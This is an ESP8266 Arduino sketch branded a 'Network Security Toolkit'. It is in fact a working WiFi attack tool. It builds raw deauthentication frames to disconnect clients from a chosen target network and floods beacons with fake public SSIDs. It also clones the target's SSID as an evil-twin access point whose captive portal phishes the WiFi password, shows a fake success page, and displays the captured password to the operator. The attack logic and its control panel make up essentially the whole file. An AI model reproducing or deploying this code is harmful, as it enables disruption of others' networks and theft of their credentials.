#include <Arduino.h>
#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <ESP8266HTTPClient.h>

extern "C" {
#include "user_interface.h"
}

// Configuration
const byte DNS_PORT = 53;
const IPAddress AP_IP(192, 168, 4, 1);
const IPAddress SUBNET(255, 255, 255, 0);
const char* DEFAULT_AP_SSID = "Security_Scanner";
const char* DEFAULT_AP_PASSWORD = "scan12345";

// Network structure
typedef struct {
  String ssid;
  uint8_t ch;
  uint8_t bssid[6];
  int rssi;
  bool encrypted;
} NetworkInfo;

// Global objects
DNSServer dnsServer;
ESP8266WebServer webServer(80);

// Network arrays
NetworkInfo networks[20];
NetworkInfo selectedNetwork;

// Operation states
struct OperationState {
  bool hotspot = false;
  bool deauthing = false;
  bool beaconFlooding = false;
  bool fakeAP = false;
  bool evilTwin = false;
  bool probeFlood = false;
  bool karmaAttack = false;
  bool michaelShutdown = false;
} opState;

// Password tracking
String capturedCredentials = "";
String currentPasswordAttempt = "";

// Timing
unsigned long lastScanTime = 0;
unsigned long lastDeauthTime = 0;
unsigned long lastStatusCheck = 0;
unsigned long lastBeaconTime = 0;
unsigned long lastProbeTime = 0;
const unsigned long SCAN_INTERVAL = 8000;
const unsigned long DEAUTH_INTERVAL = 300;
const unsigned long STATUS_INTERVAL = 1000;
const unsigned long BEACON_INTERVAL = 80;
const unsigned long PROBE_INTERVAL = 120;

// Fake AP names for beacon flood
const char* FAKE_SSIDS[] = {
  "Free WiFi", "Airport_WiFi", "Starbucks", "Hotel_Guest", "McDonalds_Free",
  "Public_WiFi", "CoffeeShop", "Mall_WiFi", "Train_Station", "Library_Public",
  "GuestNetwork", "OpenWiFi", "Free_Internet", "Cafe_WiFi", "Shopping_Center",
  "University_WiFi", "Hospital_Guest", "Restaurant_Free", "Park_WiFi", "City_Free"
};
const int FAKE_SSID_COUNT = 20;

// HTML Templates with Modern Dark Theme
const char* HTML_HEADER = R"raw(
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>%TITLE%</title>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>
        :root {
            --primary: #6366f1;
            --primary-dark: #4f46e5;
            --secondary: #10b981;
            --danger: #ef4444;
            --warning: #f59e0b;
            --dark: #0f172a;
            --darker: #020617;
            --light: #f8fafc;
            --gray: #64748b;
            --success: #22c55e;
        }
        
        * { 
            margin: 0; 
            padding: 0; 
            box-sizing: border-box; 
        }
        
        body { 
            font-family: 'Inter', 'Segoe UI', system-ui, sans-serif; 
            background: linear-gradient(135deg, var(--darker) 0%, var(--dark) 100%);
            color: var(--light);
            line-height: 1.6;
            min-height: 100vh;
            overflow-x: hidden;
        }
        
        .container { 
            max-width: 1400px; 
            margin: 0 auto; 
            padding: 20px; 
        }
        
        .header { 
            background: rgba(15, 23, 42, 0.8);
            backdrop-filter: blur(20px);
            padding: 2rem;
            border-radius: 20px;
            margin-bottom: 2rem;
            border: 1px solid rgba(255, 255, 255, 0.1);
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
            position: relative;
            overflow: hidden;
        }
        
        .header::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 1px;
            background: linear-gradient(90deg, transparent, var(--primary), transparent);
        }
        
        .card { 
            background: rgba(15, 23, 42, 0.6);
            backdrop-filter: blur(20px);
            padding: 2rem;
            border-radius: 16px; 
            margin-bottom: 1.5rem;
            border: 1px solid rgba(255, 255, 255, 0.1);
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
        }
        
        .card:hover {
            transform: translateY(-5px);
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
            border-color: rgba(99, 102, 241, 0.3);
        }
        
        .network-table { 
            width: 100%; 
            border-collapse: collapse; 
            margin: 1rem 0; 
            font-size: 0.9rem;
        }
        
        .network-table th, 
        .network-table td { 
            padding: 1rem; 
            text-align: left; 
            border-bottom: 1px solid rgba(255, 255, 255, 0.1); 
        }
        
        .network-table th { 
            background: rgba(30, 41, 59, 0.8);
            font-weight: 600; 
            color: var(--light);
            font-size: 0.8rem;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }
        
        .network-table tr {
            transition: all 0.2s ease;
        }
        
        .network-table tr:hover {
            background: rgba(30, 41, 59, 0.4);
        }
        
        .btn { 
            padding: 12px 24px; 
            border: none;
            border-radius: 12px; 
            cursor: pointer; 
            font-size: 0.9rem; 
            font-weight: 600; 
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            text-decoration: none;
            display: inline-flex;
            align-items: center;
            gap: 8px;
            text-align: center;
            font-family: inherit;
            position: relative;
            overflow: hidden;
        }
        
        .btn::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
            transition: left 0.5s;
        }
        
        .btn:hover::before {
            left: 100%;
        }
        
        .btn:hover { 
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.3);
        }
        
        .btn:active {
            transform: translateY(0);
        }
        
        .btn:disabled { 
            opacity: 0.6;
            cursor: not-allowed;
            transform: none !important;
            box-shadow: none !important;
        }
        
        .btn-primary { 
            background: linear-gradient(135deg, var(--primary), var(--primary-dark));
            color: white; 
        }
        
        .btn-danger { 
            background: linear-gradient(135deg, var(--danger), #dc2626);
            color: white; 
        }
        
        .btn-success { 
            background: linear-gradient(135deg, var(--success), #16a34a);
            color: white; 
        }
        
        .btn-warning { 
            background: linear-gradient(135deg, var(--warning), #d97706);
            color: white; 
        }
        
        .btn-secondary {
            background: linear-gradient(135deg, var(--gray), #475569);
            color: white;
        }
        
        .form-group { 
            margin-bottom: 1.5rem; 
        }
        
        .form-control { 
            width: 100%; 
            padding: 1rem; 
            background: rgba(30, 41, 59, 0.6);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 12px; 
            font-size: 1rem; 
            color: var(--light);
            font-family: inherit;
            transition: all 0.3s ease;
        }
        
        .form-control:focus { 
            border-color: var(--primary);
            outline: none;
            box-shadow: 0 0 0 3px rgba(99, 102, 241, 0.1);
        }
        
        .alert { 
            padding: 1.5rem; 
            border-radius: 12px; 
            margin: 1rem 0; 
            border: 1px solid;
        }
        
        .alert-success { 
            background: rgba(34, 197, 94, 0.1); 
            color: var(--success); 
            border-color: var(--success);
        }
        
        .alert-warning { 
            background: rgba(245, 158, 11, 0.1); 
            color: var(--warning); 
            border-color: var(--warning);
        }
        
        .status-indicator {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            padding: 6px 12px;
            background: rgba(30, 41, 59, 0.6);
            border-radius: 20px;
            font-size: 0.8rem;
            font-weight: 500;
        }
        
        .status-dot {
            width: 8px;
            height: 8px;
            border-radius: 50%;
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }
        
        .status-active .status-dot { 
            background: var(--success); 
            box-shadow: 0 0 10px var(--success);
        }
        
        .status-inactive .status-dot { 
            background: var(--danger); 
            animation: none;
        }
        
        .control-panel {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
            gap: 1rem;
            margin: 2rem 0;
        }
        
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 1rem;
            margin: 1.5rem 0;
        }
        
        .stat-card {
            background: rgba(30, 41, 59, 0.6);
            padding: 1.5rem;
            border-radius: 12px;
            text-align: center;
            border: 1px solid rgba(255, 255, 255, 0.1);
        }
        
        .stat-value {
            font-size: 2rem;
            font-weight: 700;
            background: linear-gradient(135deg, var(--primary), var(--secondary));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 0.5rem;
        }
        
        .stat-label {
            font-size: 0.8rem;
            color: var(--gray);
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }
        
        .terminal {
            background: rgba(15, 23, 42, 0.8);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 12px;
            padding: 1.5rem;
            font-family: 'JetBrains Mono', 'Fira Code', monospace;
            font-size: 0.9rem;
            color: var(--success);
            min-height: 120px;
            overflow-y: auto;
            margin: 1rem 0;
        }
        
        .terminal-line {
            margin-bottom: 0.5rem;
        }
        
        .terminal-line::before {
            content: '> ';
            color: var(--primary);
        }
        
        .glow-text {
            background: linear-gradient(135deg, var(--primary), var(--secondary));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            font-weight: 700;
        }
        
        .loading-bar {
            width: 100%;
            height: 4px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 2px;
            overflow: hidden;
            margin: 1rem 0;
        }
        
        .loading-progress {
            height: 100%;
            background: linear-gradient(90deg, var(--primary), var(--secondary));
            border-radius: 2px;
            transition: width 0.3s ease;
        }
        
        @media (max-width: 768px) {
            .container { padding: 1rem; }
            .control-panel { grid-template-columns: 1fr; }
            .card { padding: 1.5rem; }
            .header { padding: 1.5rem; }
        }
        
        .fade-in {
            animation: fadeIn 0.5s ease-in;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }
    </style>
</head>
<body>
    <div class="container">
)raw";

const char* HTML_FOOTER = R"raw(
    </div>
    <script>
        // Enhanced animations and interactions
        document.addEventListener('DOMContentLoaded', function() {
            // Add fade-in animation to cards
            const cards = document.querySelectorAll('.card');
            cards.forEach((card, index) => {
                card.style.animationDelay = `${index * 0.1}s`;
                card.classList.add('fade-in');
            });
            
            // Real-time status updates
            function updateStatus() {
                fetch('/status')
                    .then(response => response.json())
                    .then(data => {
                        // Update status indicators
                        document.querySelectorAll('.status-indicator').forEach(indicator => {
                            const operation = indicator.dataset.operation;
                            if (data[operation]) {
                                indicator.classList.add('status-active');
                                indicator.classList.remove('status-inactive');
                            } else {
                                indicator.classList.add('status-inactive');
                                indicator.classList.remove('status-active');
                            }
                        });
                    })
                    .catch(error => console.error('Status update failed:', error));
            }
            
            // Update status every 2 seconds
            setInterval(updateStatus, 2000);
            
            // Add click effects to buttons
            document.querySelectorAll('.btn').forEach(btn => {
                btn.addEventListener('click', function(e) {
                    if (this.disabled) {
                        e.preventDefault();
                        return;
                    }
                    
                    const ripple = document.createElement('span');
                    const rect = this.getBoundingClientRect();
                    const size = Math.max(rect.width, rect.height);
                    const x = e.clientX - rect.left - size / 2;
                    const y = e.clientY - rect.top - size / 2;
                    
                    ripple.style.cssText = `
                        position: absolute;
                        border-radius: 50%;
                        background: rgba(255, 255, 255, 0.6);
                        transform: scale(0);
                        animation: ripple 0.6s linear;
                        width: ${size}px;
                        height: ${size}px;
                        left: ${x}px;
                        top: ${y}px;
                    `;
                    
                    this.appendChild(ripple);
                    
                    setTimeout(() => {
                        ripple.remove();
                    }, 600);
                });
            });
        });
        
        // Ripple animation
        const style = document.createElement('style');
        style.textContent = `
            @keyframes ripple {
                to {
                    transform: scale(4);
                    opacity: 0;
                }
            }
        `;
        document.head.appendChild(style);
    </script>
</body>
</html>
)raw";

// Utility functions
String bytesToMacStr(const uint8_t* bytes, uint32_t size) {
  String str;
  for (uint32_t i = 0; i < size; i++) {
    if (bytes[i] < 0x10) str += "0";
    str += String(bytes[i], HEX);
    if (i < size - 1) str += ":";
  }
  return str;
}

void clearNetworksArray() {
  for (int i = 0; i < 20; i++) {
    networks[i] = NetworkInfo();
  }
}

void performWiFiScan() {
  WiFi.scanDelete();
  int n = WiFi.scanNetworks(false, true);
  clearNetworksArray();
  
  if (n == 0) {
    Serial.println("📡 No networks found");
    return;
  }
  
  for (int i = 0; i < n && i < 20; i++) {
    networks[i].ssid = WiFi.SSID(i);
    networks[i].ch = WiFi.channel(i);
    networks[i].rssi = WiFi.RSSI(i);
    networks[i].encrypted = WiFi.encryptionType(i) != ENC_TYPE_NONE;
    
    uint8_t* bssid = WiFi.BSSID(i);
    if (bssid != nullptr) {
      memcpy(networks[i].bssid, bssid, 6);
    }
  }
  Serial.println("✅ Scan completed: " + String(n) + " networks");
}

void setupDefaultAP() {
  WiFi.softAPConfig(AP_IP, AP_IP, SUBNET);
  WiFi.softAP(DEFAULT_AP_SSID, DEFAULT_AP_PASSWORD);
  dnsServer.start(DNS_PORT, "*", AP_IP);
}

void stopAllOperations() {
  opState.hotspot = false;
  opState.deauthing = false;
  opState.beaconFlooding = false;
  opState.fakeAP = false;
  opState.evilTwin = false;
  opState.probeFlood = false;
  opState.karmaAttack = false;
  opState.michaelShutdown = false;
  
  dnsServer.stop();
  WiFi.softAPdisconnect(true);
  delay(200);
  setupDefaultAP();
  
  Serial.println("🛑 All operations stopped");
}

// Fast response handler to prevent delays
void handleFastResponse() {
  webServer.sendHeader("Location", "/", true);
  webServer.send(302, "text/plain", "");
}

void serveCaptivePortal() {
  String html = String(HTML_HEADER);
  html.replace("%TITLE%", "WiFi Login Required");
  
  html += R"raw(
    <div class="header">
        <h1><i class="fas fa-wifi"></i> WiFi Authentication Required</h1>
        <p>Please login to access the internet</p>
    </div>
    <div class="card">
        <h2><i class="fas fa-sign-in-alt"></i> Network Login</h2>
        <div class="terminal">
            <div class="terminal-line">Connecting to: )raw" + selectedNetwork.ssid + R"raw(</div>
            <div class="terminal-line">Status: Authentication required</div>
            <div class="terminal-line">Please enter your password to continue</div>
        </div>
        
        <form method="POST" action="/verify">
            <div class="form-group">
                <label for="password">WiFi Password:</label>
                <input type="password" id="password" name="password" class="form-control" 
                       required placeholder="Enter your WiFi password">
            </div>
            <button type="submit" class="btn btn-primary">
                <i class="fas fa-unlock"></i> Connect to WiFi
            </button>
        </form>
    </div>
  )raw";
  
  html += HTML_FOOTER;
  webServer.send(200, "text/html", html);
}

void serveControlPanel() {
  String html = String(HTML_HEADER);
  html.replace("%TITLE%", "Network Security Toolkit");
  
  html += R"raw(
    <div class="header">
        <div style="display: flex; justify-content: between; align-items: center; margin-bottom: 1rem;">
            <h1 class="glow-text"><i class="fas fa-shield-alt"></i> Network Security Toolkit</h1>
            <div class="status-indicator status-active">
                <span class="status-dot"></span>
                <span>ONLINE</span>
            </div>
        </div>
        <p>Access Point: <strong>)raw" + String(DEFAULT_AP_SSID) + R"raw(</strong> | IP: <strong>)raw" + AP_IP.toString() + R"raw(</strong></p>
    </div>
  )raw";

  // Statistics
  html += "<div class='stats-grid'>";
  html += "<div class='stat-card'><div class='stat-value'>" + String(ESP.getFreeHeap() / 1024) + "</div><div class='stat-label'>Memory Free (KB)</div></div>";
  html += "<div class='stat-card'><div class='stat-value'>" + String(millis() / 1000) + "</div><div class='stat-label'>Uptime (Seconds)</div></div>";
  html += "<div class='stat-card'><div class='stat-value'>" + String(WiFi.scanComplete()) + "</div><div class='stat-label'>Networks Found</div></div>";
  html += "<div class='stat-card'><div class='stat-value'>" + String(selectedNetwork.ssid.length() > 0 ? "1" : "0") + "</div><div class='stat-label'>Target Selected</div></div>";
  html += "</div>";

  // Operation status
  html += "<div class='card'>";
  html += "<h2><i class='fas fa-chart-bar'></i> Operation Status</h2>";
  html += "<div class='control-panel'>";
  
  html += "<div class='status-indicator " + String(opState.deauthing ? "status-active" : "status-inactive") + "' data-operation='deauthing'><span class='status-dot'></span><span>Deauth Attack</span></div>";
  html += "<div class='status-indicator " + String(opState.hotspot ? "status-active" : "status-inactive") + "' data-operation='hotspot'><span class='status-dot'></span><span>Captive Portal</span></div>";
  html += "<div class='status-indicator " + String(opState.beaconFlooding ? "status-active" : "status-inactive") + "' data-operation='beaconFlooding'><span class='status-dot'></span><span>Beacon Flood</span></div>";
  html += "<div class='status-indicator " + String(opState.fakeAP ? "status-active" : "status-inactive") + "' data-operation='fakeAP'><span class='status-dot'></span><span>Fake AP</span></div>";
  html += "<div class='status-indicator " + String(opState.probeFlood ? "status-active" : "status-inactive") + "' data-operation='probeFlood'><span class='status-dot'></span><span>Probe Flood</span></div>";
  html += "<div class='status-indicator " + String(opState.karmaAttack ? "status-active" : "status-inactive") + "' data-operation='karmaAttack'><span class='status-dot'></span><span>Karma Attack</span></div>";
  
  html += "</div></div>";

  // Network selection
  html += "<div class='card'>";
  html += "<h2><i class='fas fa-wifi'></i> Available Networks</h2>";
  html += "<table class='network-table'>";
  html += "<tr><th>Network Name</th><th>BSSID</th><th>Channel</th><th>Signal</th><th>Action</th></tr>";
  
  int networkCount = 0;
  for (int i = 0; i < 20; i++) {
    if (networks[i].ssid.length() == 0) continue;
    networkCount++;
    
    String bssidStr = bytesToMacStr(networks[i].bssid, 6);
    bool isSelected = (bytesToMacStr(selectedNetwork.bssid, 6) == bssidStr);
    
    // Signal strength indicator
    String signalStrength = String(networks[i].rssi) + " dBm";
    if (networks[i].rssi > -50) signalStrength = "🟢 Excellent";
    else if (networks[i].rssi > -60) signalStrength = "🟡 Good";
    else if (networks[i].rssi > -70) signalStrength = "🟠 Fair";
    else signalStrength = "🔴 Poor";
    
    html += "<tr>";
    html += "<td><i class='fas fa-network-wired'></i> " + networks[i].ssid + "</td>";
    html += "<td><small>" + bssidStr + "</small></td>";
    html += "<td>" + String(networks[i].ch) + "</td>";
    html += "<td>" + signalStrength + "</td>";
    html += "<td>";
    html += "<form method='POST' action='/select' style='display:inline;'>";
    html += "<input type='hidden' name='bssid' value='" + bssidStr + "'>";
    html += "<button type='submit' class='btn " + String(isSelected ? "btn-success" : "btn-primary") + "' style='padding: 8px 16px; font-size: 0.8rem;'>";
    html += isSelected ? "<i class='fas fa-check'></i> Selected" : "<i class='fas fa-crosshairs'></i> Select";
    html += "</button></form>";
    html += "</td></tr>";
  }
  
  if (networkCount == 0) {
    html += "<tr><td colspan='5' style='text-align: center; padding: 2rem; color: var(--gray);'>";
    html += "<i class='fas fa-search'></i> Scanning for networks...";
    html += "</td></tr>";
  }
  
  html += "</table>";
  html += "<div style='display: flex; gap: 1rem; margin-top: 1rem;'>";
  html += "<form method='POST' action='/rescan'><button type='submit' class='btn btn-secondary'><i class='fas fa-sync-alt'></i> Rescan Networks</button></form>";
  html += "</div>";
  html += "</div>";

  // Control buttons
  html += "<div class='card'>";
  html += "<h2><i class='fas fa-gamepad'></i> Security Operations</h2>";
  html += "<div class='control-panel'>";
  
  html += "<form method='POST' action='/deauth'><button type='submit' class='btn " + String(opState.deauthing ? "btn-danger" : "btn-primary") + "' " + (selectedNetwork.ssid.length() == 0 ? "disabled" : "") + ">";
  html += opState.deauthing ? "<i class='fas fa-stop'></i> Stop Deauth" : "<i class='fas fa-broadcast-tower'></i> Start Deauth";
  html += "</button></form>";

  html += "<form method='POST' action='/hotspot'><button type='submit' class='btn " + String(opState.hotspot ? "btn-danger" : "btn-primary") + "' " + (selectedNetwork.ssid.length() == 0 ? "disabled" : "") + ">";
  html += opState.hotspot ? "<i class='fas fa-stop'></i> Stop Portal" : "<i class='fas fa-portal-enter'></i> Start Portal";
  html += "</button></form>";

  html += "<form method='POST' action='/beaconflood'><button type='submit' class='btn " + String(opState.beaconFlooding ? "btn-danger" : "btn-warning") + "'>";
  html += opState.beaconFlooding ? "<i class='fas fa-stop'></i> Stop Beacon" : "<i class='fas fa-satellite-dish'></i> Start Beacon";
  html += "</button></form>";

  html += "<form method='POST' action='/fakeap'><button type='submit' class='btn " + String(opState.fakeAP ? "btn-danger" : "btn-primary") + "' " + (selectedNetwork.ssid.length() == 0 ? "disabled" : "") + ">";
  html += opState.fakeAP ? "<i class='fas fa-stop'></i> Stop Fake AP" : "<i class='fas fa-ghost'></i> Start Fake AP";
  html += "</button></form>";

  html += "<form method='POST' action='/stopall'><button type='submit' class='btn btn-danger'><i class='fas fa-emergency'></i> Emergency Stop</button></form>";
  
  html += "</div></div>";

  // Selected network info
  if (selectedNetwork.ssid.length() > 0) {
    html += "<div class='card alert alert-success'>";
    html += "<h3><i class='fas fa-crosshairs'></i> Target Selected</h3>";
    html += "<div style='display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 1rem; margin-top: 1rem;'>";
    html += "<div><strong>SSID:</strong> " + selectedNetwork.ssid + "</div>";
    html += "<div><strong>BSSID:</strong> " + bytesToMacStr(selectedNetwork.bssid, 6) + "</div>";
    html += "<div><strong>Channel:</strong> " + String(selectedNetwork.ch) + "</div>";
    html += "<div><strong>Signal:</strong> " + String(selectedNetwork.rssi) + " dBm</div>";
    html += "</div>";
    html += "</div>";
  }

  // Captured credentials
  if (capturedCredentials.length() > 0) {
    html += "<div class='card alert alert-warning'>";
    html += "<h3><i class='fas fa-key'></i> Captured Credentials</h3>";
    html += "<div class='terminal'>";
    html += "<div class='terminal-line'>" + capturedCredentials + "</div>";
    html += "</div>";
    html += "</div>";
  }

  html += HTML_FOOTER;
  webServer.send(200, "text/html", html);
}

void handleRoot() {
  if (opState.hotspot || opState.fakeAP) {
    serveCaptivePortal();
  } else {
    serveControlPanel();
  }
}

void handleSelectNetwork() {
  if (webServer.hasArg("bssid")) {
    String targetBssid = webServer.arg("bssid");
    for (int i = 0; i < 20; i++) {
      if (bytesToMacStr(networks[i].bssid, 6) == targetBssid) {
        selectedNetwork = networks[i];
        Serial.println("🎯 Selected: " + selectedNetwork.ssid + " | BSSID: " + targetBssid);
        break;
      }
    }
  }
  handleFastResponse();
}

void handleDeauth() {
  opState.deauthing = !opState.deauthing;
  Serial.println(opState.deauthing ? "📡 Deauth STARTED" : "🛑 Deauth STOPPED");
  handleFastResponse();
}

void handleHotspot() {
  if (!opState.hotspot && selectedNetwork.ssid.length() > 0) {
    stopAllOperations();
    opState.hotspot = true;
    
    WiFi.softAPdisconnect(true);
    delay(200);
    
    WiFi.softAPConfig(AP_IP, AP_IP, SUBNET);
    WiFi.softAP(selectedNetwork.ssid.c_str());
    dnsServer.start(DNS_PORT, "*", AP_IP);
    
    Serial.println("🌐 Hotspot started: " + selectedNetwork.ssid);
  } else {
    stopAllOperations();
  }
  handleFastResponse();
}

void handleBeaconFlood() {
  opState.beaconFlooding = !opState.beaconFlooding;
  Serial.println(opState.beaconFlooding ? "📢 Beacon Flood STARTED" : "🛑 Beacon Flood STOPPED");
  handleFastResponse();
}

void handleFakeAP() {
  if (!opState.fakeAP && selectedNetwork.ssid.length() > 0) {
    stopAllOperations();
    opState.fakeAP = true;
    
    WiFi.softAPdisconnect(true);
    delay(200);
    
    WiFi.softAPConfig(AP_IP, AP_IP, SUBNET);
    WiFi.softAP(selectedNetwork.ssid.c_str(), "welcome123");
    dnsServer.start(DNS_PORT, "*", AP_IP);
    
    Serial.println("👻 Fake AP started: " + selectedNetwork.ssid);
  } else {
    stopAllOperations();
  }
  handleFastResponse();
}

void handleRescan() {
  performWiFiScan();
  handleFastResponse();
}

void handleStopAll() {
  stopAllOperations();
  handleFastResponse();
}

void handleVerifyPassword() {
  if (webServer.hasArg("password")) {
    currentPasswordAttempt = webServer.arg("password");
    capturedCredentials = "SSID: " + selectedNetwork.ssid + " | Password: " + currentPasswordAttempt + " | BSSID: " + bytesToMacStr(selectedNetwork.bssid, 6);
    
    Serial.println("🔑 Password captured: " + currentPasswordAttempt);
    
    // Show success page immediately
    String html = String(HTML_HEADER);
    html.replace("%TITLE%", "Connection Successful");
    html += R"raw(
      <div class="card alert alert-success">
        <h2><i class="fas fa-check-circle"></i> Connection Successful!</h2>
        <p>You have been successfully connected to the network.</p>
        <div class="terminal">
          <div class="terminal-line">Authentication successful</div>
          <div class="terminal-line">IP address assigned</div>
          <div class="terminal-line">Internet access granted</div>
        </div>
        <div style="margin-top: 1.5rem;">
          <a href="/" class="btn btn-success"><i class="fas fa-home"></i> Return to Dashboard</a>
        </div>
      </div>
    )raw";
    html += HTML_FOOTER;
    
    webServer.send(200, "text/html", html);
    
    // Stop operations after short delay
    delay(3000);
    stopAllOperations();
  } else {
    serveCaptivePortal();
  }
}

void handleNotFound() {
  handleFastResponse();
}

// Fast attack implementations
void performDeauthAttack() {
  if (!opState.deauthing || selectedNetwork.ssid.length() == 0) return;
  
  wifi_set_channel(selectedNetwork.ch);
  
  uint8_t deauthPacket[26] = {
    0xC0, 0x00, 0x00, 0x00,                         // Type: Deauth, Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,             // Destination (broadcast)
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,             // Source
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,             // BSSID
    0x00, 0x00, 0x01, 0x00                          // Sequence, Reason code
  };
  
  memcpy(&deauthPacket[10], selectedNetwork.bssid, 6);
  memcpy(&deauthPacket[16], selectedNetwork.bssid, 6);
  
  wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0);
}

void performBeaconFlood() {
  if (!opState.beaconFlooding) return;
  
  String ssid = FAKE_SSIDS[random(FAKE_SSID_COUNT)];
  uint8_t channel = random(1, 12);
  
  wifi_set_channel(channel);
  
  uint8_t beaconPacket[128] = {0};
  beaconPacket[0] = 0x80; // Beacon frame
  
  // Random MAC
  for(int j = 10; j < 16; j++) 
    beaconPacket[j] = random(256);
  
  memcpy(&beaconPacket[16], &beaconPacket[10], 6);
  
  beaconPacket[24] = ssid.length();
  memcpy(&beaconPacket[25], ssid.c_str(), ssid.length());
  
  int packetSize = 25 + ssid.length();
  wifi_send_pkt_freedom(beaconPacket, packetSize, 0);
}

void setup() {
  Serial.begin(115200);
  delay(1000);
  
  Serial.println("\n");
  Serial.println("🚀 Network Security Toolkit Starting...");
  Serial.println("========================================");
  
  // Initialize WiFi
  WiFi.mode(WIFI_AP_STA);
  wifi_promiscuous_enable(1);
  
  // Setup default access point
  setupDefaultAP();
  
  // Setup web server routes with fast responses
  webServer.on("/", HTTP_GET, handleRoot);
  webServer.on("/select", HTTP_POST, handleSelectNetwork);
  webServer.on("/deauth", HTTP_POST, handleDeauth);
  webServer.on("/hotspot", HTTP_POST, handleHotspot);
  webServer.on("/beaconflood", HTTP_POST, handleBeaconFlood);
  webServer.on("/fakeap", HTTP_POST, handleFakeAP);
  webServer.on("/rescan", HTTP_POST, handleRescan);
  webServer.on("/verify", HTTP_POST, handleVerifyPassword);
  webServer.on("/stopall", HTTP_POST, handleStopAll);
  webServer.onNotFound(handleNotFound);
  
  webServer.begin();
  
  // Perform initial scan
  performWiFiScan();
  
  Serial.println("✅ System Ready");
  Serial.println("📶 AP: " + String(DEFAULT_AP_SSID));
  Serial.println("🔑 Pass: " + String(DEFAULT_AP_PASSWORD));
  Serial.println("🌐 URL: http://" + AP_IP.toString());
  Serial.println("💾 Memory: " + String(ESP.getFreeHeap()) + " bytes");
}

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();
  
  unsigned long currentTime = millis();
  
  // Fast periodic operations
  if (currentTime - lastScanTime >= SCAN_INTERVAL && !opState.hotspot && !opState.fakeAP) {
    performWiFiScan();
    lastScanTime = currentTime;
  }
  
  if (opState.deauthing && currentTime - lastDeauthTime >= DEAUTH_INTERVAL) {
    performDeauthAttack();
    lastDeauthTime = currentTime;
  }
  
  if (opState.beaconFlooding && currentTime - lastBeaconTime >= BEACON_INTERVAL) {
    performBeaconFlood();
    lastBeaconTime = currentTime;
  }
  
  delay(10); // Prevent watchdog timeout
}